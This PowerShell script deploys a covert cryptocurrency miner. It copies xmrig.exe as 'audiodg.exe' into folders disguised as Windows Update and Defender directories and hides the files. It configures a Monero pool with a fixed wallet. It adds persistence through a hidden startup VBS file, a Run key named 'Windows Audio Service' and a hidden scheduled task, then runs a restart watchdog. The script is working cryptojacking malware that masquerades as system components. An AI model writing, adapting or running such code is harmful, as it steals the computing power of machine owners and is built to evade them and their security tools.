# ================================================================================================
# ENHANCED DEPLOYMENT SCRIPT - Works on ALL PCs
# ================================================================================================

param(
    [switch]$Debug,
    [switch]$TestMode
)

# Configuration
$Config = @{
    SourceMiner = Join-Path $PSScriptRoot "xmrig.exe"
    
    # Locations ordered by preference (fallback to user-accessible if admin fails)
    Locations = @(
        "C:\ProgramData\Microsoft\Windows\WindowsUpdate",
        "C:\ProgramData\Microsoft\Network\Downloader",
        "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell",
        "$env:LOCALAPPDATA\Microsoft\Windows\Defender", 
        "$env:TEMP\WindowsUpdateCache"
    )
    
    Pool = "gulf.moneroocean.stream:10128"
    Wallet = "49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
    
    MaxCPUUsage = 75
    ProcessPriority = 3
    MiningThreads = 0
}

# Override for test mode
if ($TestMode -or $env:SAFE_TEST_MODE -eq '1') {
    Write-Host "[TEST MODE] Using safe settings: 40% CPU, 2 threads" -ForegroundColor Yellow
    $Config.MaxCPUUsage = 40
    $Config.ProcessPriority = 2
    $Config.MiningThreads = 2
}

# ================================================================================================
# ENHANCED DEPLOYMENT - Tries multiple locations
# ================================================================================================

function Deploy-MinerEnhanced {
    Write-Host "`n[DEPLOYMENT] Starting enhanced deployment..." -ForegroundColor Cyan
    
    if (-not (Test-Path $Config.SourceMiner)) {
        Write-Host "[ERROR] Source miner not found: $($Config.SourceMiner)" -ForegroundColor Red
        return $null
    }
    
    $successfulLocations = @()
    
    foreach ($location in $Config.Locations) {
        Write-Host "`n[TRY] Deploying to: $location" -ForegroundColor Yellow
        
        try {
            # Create directory if needed
            if (-not (Test-Path $location)) {
                New-Item -Path $location -ItemType Directory -Force -ErrorAction Stop | Out-Null
                Write-Host "  [OK] Created directory" -ForegroundColor Green
            } else {
                Write-Host "  [OK] Directory exists" -ForegroundColor Green
            }
            
            # Copy miner with stealth name
            $destMiner = Join-Path $location "audiodg.exe"
            Copy-Item -Path $Config.SourceMiner -Destination $destMiner -Force -ErrorAction Stop
            Write-Host "  [OK] Miner copied as audiodg.exe" -ForegroundColor Green
            
            # Create config
            $configPath = Join-Path $location "config.json"
            $configContent = @{
                autosave = $false
                cpu = @{
                    enabled = $true
                    'huge-pages' = $true
                    priority = $Config.ProcessPriority
                    'max-threads-hint' = if ($Config.MiningThreads -gt 0) { $Config.MiningThreads } else { 100 }
                }
                pools = @(
                    @{
                        url = $Config.Pool
                        user = $Config.Wallet
                        pass = "x"
                        keepalive = $true
                    }
                )
            } | ConvertTo-Json -Depth 10
            
            $configContent | Set-Content -Path $configPath -Force
            Write-Host "  [OK] Config created" -ForegroundColor Green
            
            # Try to hide files (may fail on some locations)
            try {
                attrib +h +s $destMiner 2>&1 | Out-Null
                attrib +h +s $configPath 2>&1 | Out-Null
                Write-Host "  [OK] Files hidden" -ForegroundColor Green
            } catch {
                Write-Host "  [WARN] Could not hide files (non-critical)" -ForegroundColor Yellow
            }
            
            $successfulLocations += @{
                Location = $location
                MinerPath = $destMiner
                ConfigPath = $configPath
            }
            
            Write-Host "  [SUCCESS] Deployment complete!" -ForegroundColor Green
            
        } catch {
            Write-Host "  [FAILED] $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "  [INFO] Trying next location..." -ForegroundColor Cyan
        }
    }
    
    if ($successfulLocations.Count -gt 0) {
        Write-Host "`n[RESULT] Successfully deployed to $($successfulLocations.Count) location(s)" -ForegroundColor Green
        return $successfulLocations[0]  # Return first successful location
    } else {
        Write-Host "`n[ERROR] Failed to deploy to any location!" -ForegroundColor Red
        return $null
    }
}

# ================================================================================================
# ENHANCED PERSISTENCE - Only what works
# ================================================================================================

function Install-PersistenceEnhanced {
    Write-Host "`n[PERSISTENCE] Installing persistence mechanisms..." -ForegroundColor Cyan
    
    $installed = 0
    
    # 1. User startup folder (always works)
    try {
        $startupPath = [Environment]::GetFolderPath('Startup')
        $vbsPath = Join-Path $startupPath "WindowsUpdate.vbs"
        
        $vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -WindowStyle Hidden -Command Start-Process '$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\audiodg.exe' -ArgumentList '--config=config.json' -WindowStyle Hidden", 0, False
"@
        $vbsContent | Set-Content -Path $vbsPath -Force
        attrib +h $vbsPath 2>&1 | Out-Null
        Write-Host "  [OK] Startup folder entry created" -ForegroundColor Green
        $installed++
    } catch {
        Write-Host "  [FAIL] Startup folder: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # 2. Registry Run key (current user - usually works)
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name "Windows Audio Service" -Value "powershell -WindowStyle Hidden -Command Start-Process '$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\audiodg.exe' -ArgumentList '--config=config.json' -WindowStyle Hidden" -ErrorAction Stop
        Write-Host "  [OK] Registry Run key added" -ForegroundColor Green
        $installed++
    } catch {
        Write-Host "  [FAIL] Registry: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # 3. Scheduled task (current user - limited)
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command Start-Process '$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\audiodg.exe' -ArgumentList '--config=config.json' -WindowStyle Hidden"
        $trigger = New-ScheduledTaskTrigger -AtLogon -User $env:USERNAME
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
        
        Register-ScheduledTask -TaskName "Windows Audio Service Update" -Action $action -Trigger $trigger -Settings $settings -Force -ErrorAction Stop | Out-Null
        Write-Host "  [OK] Scheduled task created" -ForegroundColor Green
        $installed++
    } catch {
        Write-Host "  [FAIL] Scheduled task: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Write-Host "`n[RESULT] Installed $installed persistence mechanism(s)" -ForegroundColor Cyan
    
    if ($installed -eq 0) {
        Write-Host "[WARN] No persistence installed - miner will not auto-start" -ForegroundColor Yellow
    }
}

# ================================================================================================
# START MINER
# ================================================================================================

function Start-MinerEnhanced {
    param($DeploymentInfo)
    
    Write-Host "`n[LAUNCH] Starting miner..." -ForegroundColor Cyan
    
    if (-not $DeploymentInfo) {
        Write-Host "[ERROR] No deployment info provided!" -ForegroundColor Red
        return $false
    }
    
    try {
        # Check if already running
        $existing = Get-Process -Name "audiodg" -ErrorAction SilentlyContinue | 
            Where-Object { $_.Path -like "*Microsoft*" }
        
        if ($existing) {
            Write-Host "[INFO] Miner already running (PID: $($existing.Id))" -ForegroundColor Yellow
            return $true
        }
        
        # Start the miner
        $process = Start-Process -FilePath $DeploymentInfo.MinerPath `
            -ArgumentList "--config=`"$($DeploymentInfo.ConfigPath)`"", "--print-time=10" `
            -WorkingDirectory (Split-Path $DeploymentInfo.MinerPath) `
            -WindowStyle Hidden `
            -PassThru
        
        Start-Sleep -Seconds 2
        
        if ($process.HasExited) {
            Write-Host "[ERROR] Miner exited immediately!" -ForegroundColor Red
            return $false
        }
        
        Write-Host "[SUCCESS] Miner started!" -ForegroundColor Green
        Write-Host "  Process ID: $($process.Id)" -ForegroundColor Green
        Write-Host "  CPU Usage: $($Config.MaxCPUUsage)%" -ForegroundColor Green
        Write-Host "  Threads: $(if ($Config.MiningThreads -gt 0) { $Config.MiningThreads } else { 'Auto' })" -ForegroundColor Green
        
        # Set process priority
        try {
            $process.PriorityClass = switch ($Config.ProcessPriority) {
                1 { [System.Diagnostics.ProcessPriorityClass]::BelowNormal }
                2 { [System.Diagnostics.ProcessPriorityClass]::Normal }
                3 { [System.Diagnostics.ProcessPriorityClass]::AboveNormal }
                4 { [System.Diagnostics.ProcessPriorityClass]::High }
                default { [System.Diagnostics.ProcessPriorityClass]::Normal }
            }
            Write-Host "  Priority: Set successfully" -ForegroundColor Green
        } catch {
            Write-Host "  Priority: Could not set (non-critical)" -ForegroundColor Yellow
        }
        
        return $true
        
    } catch {
        Write-Host "[ERROR] Failed to start miner: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# ================================================================================================
# SIMPLE WATCHDOG
# ================================================================================================

function Start-WatchdogEnhanced {
    param($DeploymentInfo)
    
    Write-Host "`n[WATCHDOG] Starting monitoring..." -ForegroundColor Cyan
    Write-Host "Press Ctrl+C to stop" -ForegroundColor Yellow
    
    while ($true) {
        Start-Sleep -Seconds 15
        
        $miners = Get-Process -Name "audiodg" -ErrorAction SilentlyContinue | 
            Where-Object { $_.Path -like "*Microsoft*" }
        
        if (-not $miners) {
            Write-Host "[WATCHDOG] Miner not running - restarting..." -ForegroundColor Yellow
            Start-MinerEnhanced -DeploymentInfo $DeploymentInfo
        } else {
            # Show status every minute
            if ((Get-Date).Second -lt 15) {
                $miner = $miners[0]
                $cpu = try { (Get-Counter "\Process(audiodg)\% Processor Time").CounterSamples[0].CookedValue } catch { 0 }
                Write-Host "[STATUS] Miner running | PID: $($miner.Id) | CPU: $([math]::Round($cpu, 1))%" -ForegroundColor Green
            }
        }
    }
}

# ================================================================================================
# MAIN EXECUTION
# ================================================================================================

Write-Host @"
================================================================
 ENHANCED MINER DEPLOYMENT
 Handles all permission issues gracefully
================================================================
"@ -ForegroundColor Cyan

# 1. Deploy
$deployment = Deploy-MinerEnhanced
if (-not $deployment) {
    Write-Host "`n[ABORT] Deployment failed - cannot continue!" -ForegroundColor Red
    return
}

# 2. Install persistence (optional - may fail on personal PC)
Install-PersistenceEnhanced

# 3. Start miner
if (Start-MinerEnhanced -DeploymentInfo $deployment) {
    # 4. Start watchdog
    Start-WatchdogEnhanced -DeploymentInfo $deployment
} else {
    Write-Host "`n[ABORT] Failed to start miner!" -ForegroundColor Red
}
